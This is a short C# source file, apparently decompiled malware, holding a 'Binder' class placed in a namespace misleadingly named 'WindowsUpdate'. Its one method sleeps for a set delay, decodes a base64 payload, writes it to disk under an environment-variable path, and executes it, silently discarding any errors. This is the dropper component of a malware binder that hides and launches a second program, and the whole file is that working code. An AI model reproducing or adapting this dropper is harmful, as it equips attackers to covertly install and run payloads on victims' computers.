using System;
using System.Diagnostics;
using System.IO;
using System.Threading;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace WindowsUpdate;

public class Binder
{
	[DebuggerNonUserCode]
	public Binder()
	{
	}

	public void NewBinder(string BinderBytes, string BinderPath, string BinderSleep, string BinderName)
	{
		try
		{
			Thread.Sleep(Conversions.ToInteger(BinderSleep));
			File.WriteAllBytes(Interaction.Environ(BinderPath) + "\\" + BinderName, Convert.FromBase64String(BinderBytes));
			Process.Start(Interaction.Environ(BinderPath) + "\\" + BinderName);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}
}
